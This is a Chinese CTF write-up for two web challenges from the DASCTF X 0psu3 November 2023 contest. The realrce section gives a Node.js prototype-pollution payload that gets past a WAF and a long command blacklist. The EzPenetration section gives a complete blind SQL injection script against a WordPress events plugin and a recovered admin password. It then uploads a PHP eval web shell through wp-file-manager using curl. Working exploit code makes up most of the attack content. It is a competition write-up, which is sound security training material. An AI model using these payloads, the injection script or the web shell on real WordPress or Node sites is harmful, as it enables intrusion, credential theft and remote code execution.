---
title: "DASCTF X 0psu3十一月挑战赛 2023"
description: "DASCTF X 0psu3十一月挑战赛 2023 Writeup"

date: 2023-11-28T16:50:14+08:00
lastmod: 2025-11-10T16:50:14+08:00

math: true
mermaid: true

categories:
  - Writeup
tags:
  - CTF
---
<!--more-->

# Web

## realrce

附件中有源码：

```javascript
function waf(input_code) {
    bypasspin = /%[0-9a-fA-F]{2}/i;
    const bypasscode = bypasspin.test(input_code);
    if (bypasscode) {
        try {
            return waf(decodeURIComponent(input_code));
        } catch (error) {
            console.error("Error decoding input: ", error);
            return false;
        }
    }
    const blacklist = [/__proto__/i, /constructor/i, /prototype/i];
    for (const blackword of blacklist) {
        if (blackword.test(input_code)) {
            return true;
        }
    }
    return false;
}
```

利用报错来绕过waf进行原型链污染

```php
function LockCylinder(input, blackchr = ["&&", "||", "&", "|", ">", "*", "+", "$", ";"]) {
    const resultArray = [];
    let currentPart = "";

    for (let i = 0; i < input.length; i++) {
        const currentChar = input[i];

        if (blackchr.includes(currentChar)) {
            if (currentPart.length > 0) {
                resultArray.push(currentPart);
                currentPart = "";
            }
        } else {
            currentPart += currentChar;
        }
    }
    if (currentPart.length > 0) {
        resultArray.push(currentPart);
    }

    return resultArray;
}
```

```php
function check_cmd(cmd) {
    const command = ["{", ";", "<>", "`", "'", "$", "if", "then", "else", "elif", "fi", "case", "esac", "for", "select", "while", "until", "do", "done", "in", "function", "time", "coproc", "alias", "bg", "bind", "break", "builtin", "caller", "cd", "command", "compgen", "complete", "compopt", "continue", "declare", "dirs", "disown", "echo", "enable", "eval", "exec", "exit", "export", "false", "fc", "fg", "getopts", "hash", "help", "history", "jobs", "kill", "let", "local", "logout", "mapfile", "popd", "printf", "pushd", "pwd", "read", "readarray", "readonly", "return", "set", "shift", "shopt", "source", "suspend", "test", "times", "trap", "true", "type", "typeset", "ulimit", "umask", "unalias", "unset", "wait", "vipw", "mkdumprd", "ifenslave", "fsck", "chpasswd", "useradd", "rtstat", "lnstat", "hwclock", "dhclient", "pwunconv", "groupmems", "mksquashfs", "chkconfig", "ethtool", "packer", "mkdict", "agetty", "applygnupgdefaults", "zramctl", "swaplabel", "blkzone", "pwconv", "cfdisk", "ldattach", "reboot", "tipc", "fstrim", "clockdiff", "groupadd", "dmfilemapd", "runuser", "modinfo", "swapoff", "telinit", "sfdisk", "ctstat", "clock", "rtpr", "fsfreeze", "ldconfig", "fdformat", "getcap", "kexec", "rdma", "tracepath", "rtmon", "rtacct", "fdisk", "udevadm", "usermod", "findfs", "halt", "resizepart", "routef", "genl", "mkswap", "poweroff", "rdisc", "grpunconv", "partx", "rtcwake", "nologin", "rfkill", "lspci", "vigr", "grpconv", "ip", "blkdeactivate", "addgnupghome", "chroot", "shutdown", "unsquashfs", "readprofile", "adduser", "groupmod", "ss", "dmstats", "ifcfg", "modprobe", "depmod", "iconvconfig", "sulogin", "rmmod", "grpck", "nstat", "ifstat", "sysctl", "insmod", "routel", "zdump", "blkdiscard", "getpcaps", "losetup", "setpci", "dmsetup", "wipefs", "addpart", "zic", "userdel", "makedumpfile", "blkid", "groupdel", "setcap", "chgpasswd", "resolvconf", "newusers", "init", "arping", "pwck", "devlink", "lsmod", "ping", "mkfs", "faillock", "runlevel", "blockdev", "swapon", "alternatives", "arpd", "delpart", "pidof", "chcpu", "capsh", "ctrlaltdel", "bridge", "less", "gpgsplit", "pgrep", "truncate", "localedef", "printf", "gencat", "sed", "ptx", "nm", "pwmake", "zmore", "tzselect", "script", "dnsdomainname", "ar", "more", "journalctl", "gunzip", "makedb", "tac", "col", "sync", "vi", "locale", "prlimit", "nisdomainname", "timedatectl", "ipcmk", "isosize", "free", "alias", "taskset", "factor", "pinky", "arch", "lscpu", "awk", "tty", "xmllint", "xzcmp", "readelf", "kdumpctl", "tsort", "nice", "cal", "rpmdb", "newgrp", "xmlwf", "slabtop", "utmpdump", "tar", "basename", "eject", "ranlib", "wall", "zless", "sort", "nsenter", "getent", "chrt", "mount", "bash", "systemctl", "vmstat", "xmlcatalog", "date", "lsinitrd", "tload", "chmod", "setsid", "getopts", "colcrt", "su", "lsipc", "login", "lsns", "unalias", "lastb", "df", "gpg", "type", "gpgv", "pathchk", "groups", "lsmem", "users", "as", "ipcs", "jobs", "command", "iconv", "dwp", "domainname", "xzcat", "ldd", "whoami", "strip", "dircolors", "nl", "trust", "stty", "ul", "chacl", "loginctl", "gzip", "xzmore", "zcat", "busctl", "fincore", "fgrep", "dmesg", "rm", "mv", "cat", "lslogins", "numfmt", "flock", "realpath", "find", "tracepath", "lesskey", "printenv", "du", "grep", "udevadm", "tee", "rename", "gawk", "mkdir", "sg", "xzegrep", "xzdec", "split", "whereis", "strings", "setfacl", "mkfifo", "chage", "xzgrep", "kill", "rvi", "size", "ypdomainname", "tr", "umount", "rev", "wdctl", "uniq", "ps", "stdbuf", "chgrp", "setarch", "cd", "dirmngr", "write", "lastlog", "gsettings", "ex", "ipcrm", "cp", "fallocate", "colrm", "rpm", "pwdx", "xargs", "objdump", "ld", "chcon", "skill", "yum", "who", "gapplication", "stat", "sleep", "wait", "fg", "uuidgen", "logger", "pwscore", "xz", "mesg", "rmdir", "zgrep", "chmem", "newuidmap", "evmctl", "wc", "top", "egrep", "fold", "zfgrep", "link", "csplit", "sum", "expand", "getfacl", "newgidmap", "join", "install", "bootctl", "xzless", "runcon", "dirname", "comm", "false", "hostname", "unlink", "sh", "ipcalc", "unexpand", "nohup", "zegrep", "head", "getopt", "raw", "hexdump", "mountpoint", "lslocks", "coreutils", "shred", "sotruss", "true", "pldd", "uuidparse", "localectl", "gtar", "test", "znew", "logname", "gzexe", "rpmquery", "touch", "hash", "cpio", "sprof", "hostnamectl", "uname", "unxz", "zdiff", "gdbus", "namei", "ls", "kmod", "info", "umask", "zcmp", "w", "mktemp", "pwd", "column", "scriptreplay", "lessecho", "look", "setterm", "gdbmtool", "rpmkeys", "bg", "id", "gpasswd", "dracut", "vdir", "mcookie", "elfedit", "chown", "objcopy", "hostid", "shuf", "view", "mknod", "gpgparsemail", "fc", "tail", "zforce", "last", "dir", "ionice", "read", "resolvectl", "watchgnupg", "unshare", "timeout", "getconf", "findmnt", "pr", "xzfgrep", "ping", "rview", "fmt", "echo", "readlink", "dd", "paste", "od", "setpriv", "coredumpctl", "dnf", "xzdiff", "renicerpmverify", "pkill", "mkinitrd", "pmap", "snice", "gio", "gpgconf", "expr", "ulimit", "nproc", "pidof", "watch", "cksum", "yes", "rpmverify", "lsblk", "catchsegv", "uptime", "seq", "ln", "cut", "bashbug", "curl", "gprof", "node", "npm", "corepack", "npx", "vipw", "mkdumprd", "ifenslave", "fsck", "chpasswd", "useradd", "rtstat", "lnstat", "hwclock", "dhclient", "pwunconv", "groupmems", "mksquashfs", "chkconfig", "ethtool", "packer", "mkdict", "agetty", "applygnupgdefaults", "zramctl", "swaplabel", "blkzone", "pwconv", "cfdisk", "ldattach", "reboot", "tipc", "fstrim", "clockdiff", "groupadd", "dmfilemapd", "runuser", "modinfo", "swapoff", "telinit", "sfdisk", "ctstat", "clock", "rtpr", "fsfreeze", "ldconfig", "fdformat", "getcap", "kexec", "rdma", "tracepath", "rtmon", "rtacct", "fdisk", "udevadm", "usermod", "findfs", "halt", "resizepart", "routef", "genl", "mkswap", "poweroff", "rdisc", "grpunconv", "partx", "rtcwake", "nologin", "rfkill", "lspci", "vigr", "grpconv", "ip", "blkdeactivate", "addgnupghome", "chroot", "shutdown", "unsquashfs", "readprofile", "adduser", "groupmod", "ss", "dmstats", "ifcfg", "modprobe", "depmod", "iconvconfig", "sulogin", "rmmod", "grpck", "nstat", "ifstat", "sysctl", "insmod", "routel", "zdump", "blkdiscard", "getpcaps", "losetup", "setpci", "dmsetup", "wipefs", "addpart", "zic", "userdel", "makedumpfile", "blkid", "groupdel", "setcap", "chgpasswd", "resolvconf", "newusers", "init", "arping", "pwck", "devlink", "lsmod", "ping", "mkfs", "faillock", "runlevel", "blockdev", "swapon", "alternatives", "arpd", "delpart", "pidof", "chcpu", "capsh", "ctrlaltdel", "bridge", "less", "gpgsplit", "pgrep", "truncate", "localedef", "printf", "gencat", "sed", "ptx", "nm", "pwmake", "zmore", "tzselect", "script", "dnsdomainname", "ar", "more", "journalctl", "gunzip", "makedb", "tac", "col", "sync", "vi", "locale", "prlimit", "nisdomainname", "timedatectl", "ipcmk", "isosize", "free", "alias", "taskset", "factor", "pinky", "arch", "lscpu", "awk", "tty", "xmllint", "xzcmp", "readelf", "kdumpctl", "tsort", "nice", "cal", "rpmdb", "newgrp", "xmlwf", "slabtop", "utmpdump", "tar", "basename", "eject", "ranlib", "wall", "zless", "sort", "nsenter", "getent", "chrt", "mount", "bash", "systemctl", "vmstat", "xmlcatalog", "date", "lsinitrd", "tload", "chmod", "setsid", "getopts", "colcrt", "su", "lsipc", "login", "lsns", "unalias", "lastb", "df", "gpg", "type", "gpgv", "pathchk", "groups", "lsmem", "users", "as", "ipcs", "jobs", "command", "iconv", "dwp", "domainname", "xzcat", "ldd", "whoami", "strip", "dircolors", "nl", "trust", "stty", "ul", "chacl", "loginctl", "gzip", "xzmore", "zcat", "busctl", "fincore", "fgrep", "dmesg", "rm", "mv", "cat", "lslogins", "numfmt", "flock", "realpath", "find", "tracepath", "lesskey", "printenv", "du", "grep", "udevadm", "tee", "rename", "gawk", "mkdir", "sg", "xzegrep", "xzdec", "split", "whereis", "strings", "setfacl", "mkfifo", "chage", "xzgrep", "kill", "rvi", "size", "ypdomainname", "tr", "umount", "rev", "wdctl", "uniq", "ps", "stdbuf", "chgrp", "setarch", "cd", "dirmngr", "write", "lastlog", "gsettings", "ex", "ipcrm", "cp", "fallocate", "colrm", "rpm", "pwdx", "xargs", "objdump", "ld", "chcon", "skill", "yum", "who", "gapplication", "stat", "sleep", "wait", "fg", "uuidgen", "logger", "pwscore", "xz", "mesg", "rmdir", "zgrep", "chmem", "newuidmap", "evmctl", "wc", "top", "egrep", "fold", "zfgrep", "link", "csplit", "sum", "expand", "getfacl", "newgidmap", "join", "install", "bootctl", "xzless", "runcon", "dirname", "comm", "false", "hostname", "unlink", "sh", "ipcalc", "unexpand", "nohup", "zegrep", "head", "getopt", "raw", "hexdump", "mountpoint", "lslocks", "coreutils", "shred", "sotruss", "true", "pldd", "uuidparse", "localectl", "gtar", "test", "znew", "logname", "gzexe", "rpmquery", "touch", "hash", "cpio", "sprof", "hostnamectl", "env", "uname", "unxz", "zdiff", "gdbus", "namei", "ls", "kmod", "info", "umask", "zcmp", "w", "mktemp", "pwd", "column", "scriptreplay", "lessecho", "look", "setterm", "gdbmtool", "rpmkeys", "bg", "id", "gpasswd", "dracut", "vdir", "mcookie", "elfedit", "chown", "objcopy", "hostid", "shuf", "view", "mknod", "gpgparsemail", "fc", "tail", "zforce", "last", "dir", "ionice", "read", "resolvectl", "watchgnupg", "unshare", "timeout", "getconf", "findmnt", "pr", "xzfgrep", "ping", "rview", "fmt", "echo", "readlink", "dd", "paste", "od", "setpriv", "coredumpctl", "dnf", "xzdiff", "renice", "pkill", "mkinitrd", "pmap", "snice", "gio", "gpgconf", "expr", "ulimit", "nproc", "pidof", "watch", "cksum", "yes", "rpmverify", "lsblk", "catchsegv", "uptime", "seq", "ln", "cut", "bashbug", "curl", "gprof", "node", "npm", "corepack", "npx"];
    const eval_chr = ["<", ">"];
    for (let i = 0; i < command.length; i++) {
        if (cmd.includes(command[i] + '&') || cmd.includes('&' + command[i]) || cmd.includes(command[i] + '|') || cmd.includes('|' + command[i]) || cmd.includes(';' + command[i]) || cmd.includes('(' + command[i]) || cmd.includes('/' + command[i])) {
            return false;
        }
    }
    for (let j = 0; j < eval_chr.length; j++) {

        if (cmd.includes(eval_chr[j])) {
            return false;
        }
    }
    return true;
}
```

`check_cmd`中不允许使用带参数的命令

[我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html)

paylaod：

```python
import requests

url = "http://bc645e8b-eeea-4bbe-ae7a-861bd0429a00.node4.buuoj.cn:81/"
payload = {"msg": {"name": "%ff", "__proto__": {"cmd_rce": "env $'cat' /flag"}}}

response = requests.post(url, json=payload)

print(response.text)
```

![image-20240606193507546](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193507709-1142423974.png)

## EzPenetration

一个Wordpress的站点，利用wpscan工具扫描一下**（有token和没token的差距真的很大！）**：

```sh
wpscan --url http://10.10.10.10/wordpress -e --api-token xxxxxxxxxxxxxxxxxxx #-e简单进行整体快速扫描
```

![image-20240606193529910](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193530755-1331602688.png)

![image-20240606193534307](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193534540-849651288.png)

发现 **Registrations for the Events Calendar < 2.7.6 - Unauthenticated SQL Injection** 的漏洞以及yanshu用户

利用二分法爆破脚本进行数据库爆破

```python
#! /bin/python
import requests


def main():
    session = requests.Session()
    paramsGet = {"action": "rtec_send_unregister_link"}
    result = ''
    if 'wp_option' not in __import__('os').listdir('.'):
        __import__('os').system('touch wp_option')  # 用于记录wp_options表的内容
    with open('wp_option', 'r') as f:  # 断点重连
        result = f.read()[0:-1]
    i = len(result)
    while True:
        i = i + 1
        head = 30
        tail = 130
        while head < tail:
            mid = (head + tail) >> 1
            paramsPost = {"email": "r3tr0young@gmail.com",
                          "event_id": f"3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),{i},1)) from wp_options where option_id = 16)>{mid})-- "}
            cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
            response = session.post("http://127.0.0.1:8080/wp-admin/admin-ajax.php", data=paramsPost, params=paramsGet,
                                    cookies=cookies)
            if "success" in response.text:
                head = mid + 1
            else:
                tail = mid
        if head != 30:
            result += chr(head)
            print(result)
            with open('wp_option', 'w') as f:
                f.write(result)
        else:
            break
def restart():
    try:
        main()
    except:
        restart()
if __name__ == '__main__':
    try:
        main()
    except:
        restart()
```

![image-20240606193659818](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193700417-1243153106.png)

利用脚本爆破密码结合wpscan扫描出来的用户登录

> yanshu 
> fO0CO2#0ky#oLgH1JI

登录管理员账号到后台，更改插件的php代码或者安装一个具有漏洞的插件，如wp-file-manager，进行rce

安装完成后访问`/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`

![image-20240606193743002](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193743286-1748806443.png)

出现此界面说明漏洞存在

准备好一句话木马`shell.php`：

```php
<?php @eval($_POST[1]);?>
```

利用curl命令上传：

```php
curl -F cmd=upload -F target=l1_ -F upload[]=@shell.php -XPOST "http://node4.buuoj.cn:29777/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

![image-20240606193805251](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193805586-837043641.png)

蚁剑连接:

![image-20240606193814588](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193814740-1051079640.png)

在根目录找到flag：

![image-20240606193820515](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240606193820748-29707845.png)